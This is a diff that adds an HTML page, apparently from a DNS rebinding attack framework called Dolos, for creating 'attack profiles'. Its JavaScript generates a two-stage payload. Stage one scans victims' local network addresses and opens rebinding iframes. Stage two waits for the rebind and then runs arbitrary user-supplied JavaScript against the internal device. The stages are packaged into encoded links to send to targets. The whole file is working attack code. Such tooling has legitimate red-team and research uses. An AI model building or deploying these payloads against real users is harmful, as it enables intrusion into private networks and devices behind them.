@@ -1,0 +1,132 @@
+<HTML>
+  <SCRIPT>
+  function submitData() {
+    save_name = document.getElementById("save_name").value;
+    path = document.getElementById("detectpath").value;
+    port = document.getElementById("detectport").value;
+    method = document.getElementById("httpmethod").value;
+    requestdata = document.getElementById("requestdata").value;
+    payload = document.getElementById("payload").value;
+    results = document.getElementById("results");
+    payloads = document.getElementById("payloads");
+    faintmode = document.getElementById("FAINTMODE").value;
+
+    // Prepared template for staging the rebind exploit
+    // The goal of this code is to find devices and add IFRAME for rebinding
+    stage1_template = `var results_box = document.createElement("DIV");
+    results_box.id = "results_box";
+    document.body.appendChild(results_box);
+	    fetch("http://" + ipaddr + ":%port_num%%path%",{ method: '%http_method%', mode: 'no-cors'%fetch_data% }).then(function(response) {
+                if (response.status === 0) {
+			results_box = document.getElementById("results_box");
+                        results_box.innerHTML += "<p>http://" + ipaddr + ":%port_num% could be a target.</p>";
+                        console.log("Launching attack on possible target at: " + ipaddr);
+                        var attack_frame = document.createElement("IFRAME");
+        		attack_frame.src = "/rebind?ip_addr=" + ipaddr + "&port_number=%port_num%&exploit_payload=%stage2_payload%&static_response_list=%path%,404";
+        		attack_frame.width = "450";
+        		attack_frame.height = "400";
+        		attack_frame.scrolling = "no";
+        		document.body.appendChild(attack_frame);
+                }
+        });`;
+
+    // Prepared template for the stage 2 payload which executes on the rebinding domain
+    // This payload must recognize when DNS has updated and then run user-supplied JS
+    stage2_template = `
+	var binding_complete = false;
+        var timer = setInterval(check_binding, 1000);
+        var startTime = Math.floor(Date.now() / 1000);
+        function check_binding() {
+	    if (binding_complete) {
+		    clearInterval(timer);
+		    return;
+	    }
+            var binding_check = new XMLHttpRequest();
+            binding_check.open("%http_method%", "%path%", true);
+            binding_check.onload = function (e) {
+                if (binding_check.readyState === 4) {
+                        if (binding_check.status !== 404) {
+				if (binding_complete==false) {
+					clearInterval(timer);
+					binding_complete = true;
+                                	var duration = Math.floor(Date.now() / 1000) - startTime;
+                                	console.log("DNS rebinding completed in " + duration + " seconds.");
+					results_box = document.getElementById("results_box");
+					results_box.innerHTML += "<P>DNS rebinding completed in " + duration + " seconds.</P>";
+// User-supplied rebind payload start:
+%rebind_payload%
+// End
+				} // if (binding_complete==false)
+                        }
+                }
+            }
+            binding_check.send(%post_data%);
+        }
+    `;
+
+    stage2_wrapper = "<HTML><H1>DNS Rebinding In Progress</H1><DIV ID=results_box></DIV>";
+    if (requestdata.length > 0) {
+	    data = "'" + requestdata + "'";
+	    fetch_data = ", body: '" + requestdata + "'";
+    }
+    else {
+	    data = '';
+	    fetch_data = '';
+    }
+    stage2_payload = stage2_template.replace("%http_method%",method).replace("%path%",path).replace("%post_data%", data).replace("%rebind_payload%", payload);
+    stage1_payload = stage1_template.replace("%http_method%",method).split("%path%").join(path).split("%port_num%").join(port).replace("%fetch_data%", fetch_data).replace("%stage2_payload%",btoa(stage2_wrapper + "\x3CSCRIPT\x3E"+ stage2_payload + "\x3C/SCRIPT\x3E"));
+    base_url = "http://" + document.domain;
+    if (window.location.port) base_url += ":" + window.location.port;
+    if (save_name.length > 0) {
+      results.innerHTML = "<B>Processing...</B>";
+      url = "/init?save=" + save_name;
+      data = "ip_callback=" + btoa(stage1_payload) + "&FAINTMODE=" + faintmode;
+      fetch(url, {method: "post", body: data}).then(function(response)
+        {
+          if (response.status == 200){
+              url_path = "/init?load=" + save_name;
+              results.innerHTML = "<A href='" + base_url + url_path + "'>Load: " + save_name + "</A>";
+	      url = base_url + "/init?ip_callback=" + btoa(stage1_payload);
+	      results.innerHTML += "<BR><A href='" + url + "'>Encoded Payload Link</A>";
+          }
+          else {
+              results.innerHTML = "Encountered a problem. response.status == " + response.status;
+          }
+        });
+    } else {
+	url = base_url + "/init?ip_callback=" + btoa(stage1_payload);
+        results.innerHTML = "<a href='" + url + "'>Encoded Payload Link</A>";
+    }
+    payloads.innerHTML = "<P><H2>Stage 1</H2><BR><code><pre>" + escapeHtml(stage1_payload) + "</pre></code></P>";
+    payloads.innerHTML += "<P><H2>Stage 2 (decoded)</H2><BR><code><pre>" + escapeHtml(stage2_payload) + "</pre></code></P>";
+  }
+
+  // From: https://stackoverflow.com/questions/1787322/htmlspecialchars-equivalent-in-javascript
+  function escapeHtml(text) {
+      var map = {
+        '&': '&amp;',
+        '<': '&lt;',
+        '>': '&gt;',
+        '"': '&quot;',
+        "'": '&#039;'
+      };
+
+  return text.replace(/[&<>"']/g, function(m) { return map[m]; });
+}
+  </SCRIPT>
+  <TITLE>Dolos Attack Profile</TITLE>
+  <H1>Dolos Attack Profile Creation</H1>
+  <FORM>
+	  <P>Profile Name: <INPUT TYPE=TEXT ID=save_name></P>
+	  <P>Detection Path: <INPUT TYPE=TEXT ID=detectpath><br><br>
+             <em>Detection Path</em> must return something other than 404</P>
+          <P>HTTP Method: <INPUT TYPE=TEXT ID=httpmethod VALUE=GET></P>
+	  <P>Request Data (optional): <INPUT TYPE=TEXT ID=requestdata><BR><BR>
+	  <STRONG>Note:</STRONG> The request data should not contain unescaped double quotes (")</P>
+	  <P>Port Number: <INPUT TYPE=TEXT ID=detectport value=80></P>
+	  <P>Fetch API Network Timing Enabled: <SELECT ID=FAINTMODE><OPTION VALUE=0>No</OPTION><OPTION VALUE=1 selected>Auto</OPTION><OPTION VALUE=2>Yes</OPTION></SELECT></P>
+	  <P>JavaScript to run after rebinding:<BR><TEXTAREA ID=payload rows=15 cols=80></TEXTAREA></P>
+	  <P><INPUT TYPE=BUTTON ONCLICK="submitData()" VALUE="Submit"></P>
+	  <P><DIV ID=results></DIV><DIV ID=payloads></DIV></P>
+  </FORM>
+</HTML>
